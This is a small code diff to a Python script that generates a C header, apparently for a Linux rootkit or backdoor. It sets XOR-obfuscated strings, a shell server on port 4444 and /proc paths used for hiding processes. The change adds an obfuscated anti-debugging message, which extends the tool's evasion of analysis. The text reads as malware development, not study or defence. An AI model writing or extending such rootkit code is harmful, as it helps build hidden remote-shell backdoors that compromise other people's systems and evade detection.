@@ -38,6 +38,7 @@ header_template = '''#define _GNU_SOURCE
 #define TERM\t"{term}"
 #define CMD_PROC_NAME\t"{cmd_proc_name}"
 #define PROC_PATH\t"{proc_path}"
+#define ANTI_DEBUG_MSG\t"{anti_debug_msg}"
 
 #define MAX_LEN 1024
 
@@ -102,7 +103,8 @@ header = header_template.format(
     shell_server=xor("shellserver"),
     shell_server_port=4444,
     cmd_proc_name=xor("/proc/%d/status"),
-    proc_path=xor("/proc/")
+    proc_path=xor("/proc/"),
+    anti_debug_msg=xor("Don't scratch the walls")
 )
 
 # XOR the syscall names and format them into a list
